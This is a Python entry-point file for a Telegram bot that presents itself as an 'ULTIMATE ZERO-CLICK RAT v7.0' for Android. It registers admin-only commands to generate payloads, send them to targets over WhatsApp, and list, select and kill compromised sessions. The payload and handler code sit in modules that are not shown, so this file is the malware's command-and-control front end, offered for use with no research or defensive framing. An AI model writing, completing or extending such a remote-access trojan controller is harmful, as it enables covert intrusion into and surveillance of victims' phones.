import logging
import sys
import os
from telegram.ext import Application, CommandHandler, CallbackQueryHandler
from telegram.constants import ParseMode

sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from config import BOT_TOKEN, ADMIN_CHAT_ID
from handlers import *
from keyboards import get_main_keyboard

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Admin Only Decorator
def admin_only(func):
    async def wrapper(update, context):
        user_id = update.effective_user.id
        if user_id != ADMIN_CHAT_ID:
            await update.message.reply_text(
                "🚫 **ACCESS DENIED!**\n\n❌ You are not authorized to use this bot.\n\n_This bot is for personal use only._",
                parse_mode=ParseMode.MARKDOWN
            )
            logger.warning(f"🚨 Unauthorized access attempt from: {user_id}")
            return
        return await func(update, context)
    return wrapper

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Commands (Admin Only)
    app.add_handler(CommandHandler("start", admin_only(start_command)))
    app.add_handler(CommandHandler("help", admin_only(help_command)))
    app.add_handler(CommandHandler("generate", admin_only(generate_payload_command)))
    app.add_handler(CommandHandler("send", admin_only(send_whatsapp_command)))
    app.add_handler(CommandHandler("sessions", admin_only(list_sessions_command)))
    app.add_handler(CommandHandler("select", admin_only(select_session_command)))
    app.add_handler(CommandHandler("kill", admin_only(kill_session_command)))
    
    # Callback Handler (All 200+ Buttons)
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    logger.info("="*50)
    logger.info("🔥 ULTIMATE ZERO-CLICK RAT v7.0 STARTED!")
    logger.info(f"👑 Admin ID: {ADMIN_CHAT_ID}")
    logger.info(f"✅ 200+ Features Fully Ready!")
    logger.info(f"🎯 Zero-Click Payload Generator: Active")
    logger.info(f"📱 Android RAT System: Online")
    logger.info("="*50)
    
    app.run_polling()

if __name__ == "__main__":
    main()
